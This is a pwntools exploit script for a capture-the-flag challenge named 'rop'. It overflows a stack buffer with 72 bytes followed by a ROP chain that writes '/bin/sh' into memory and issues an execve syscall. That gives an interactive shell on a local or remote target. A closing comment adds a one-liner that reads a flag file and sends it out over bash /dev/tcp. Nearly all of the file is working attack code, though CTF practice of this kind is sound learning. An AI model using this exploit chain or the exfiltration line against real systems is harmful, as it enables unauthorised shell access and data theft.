from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./rop")
    if args.GDB:
        gdb.attach(r,"b *0x00000000004017f2")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
# s       = lambda data               :r.send(data)
# sa      = lambda x, y               :r.sendafter(x, y)
# sl      = lambda data               :r.sendline(data)
# sla     = lambda x, y               :r.sendlineafter(x, y)
# ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
# uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
# uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
# leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
# l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
# l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

pop_rsi = 0x0000000000409f0e
pop_rax = 0x000000000044fd07
mov_rsi_rax = 0x0000000000452475
pop_rdi = 0x0000000000401e9f
rop = b''
rop += p64(pop_rsi)
rop += p64(0x4c50e0)
rop += p64(pop_rax)
rop += b'/bin/sh\x00'
rop += p64(mov_rsi_rax)

rop += p64(pop_rax)
rop += p64(0x3b)

rop += p64(pop_rdi)
rop += p64(0x4c50e0)

rop += p64(pop_rsi)
rop += p64(0)

pop_rdx_pop_rbx = 0x0000000000485a8b
rop += p64(pop_rdx_pop_rbx)
rop += p64(0)
rop += p64(0)
syscall = 0x0000000000401c54
rop += p64(syscall)

payload = b'A' * 72 + rop

r.sendline(payload)


r.interactive()

'''
Writeup:
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''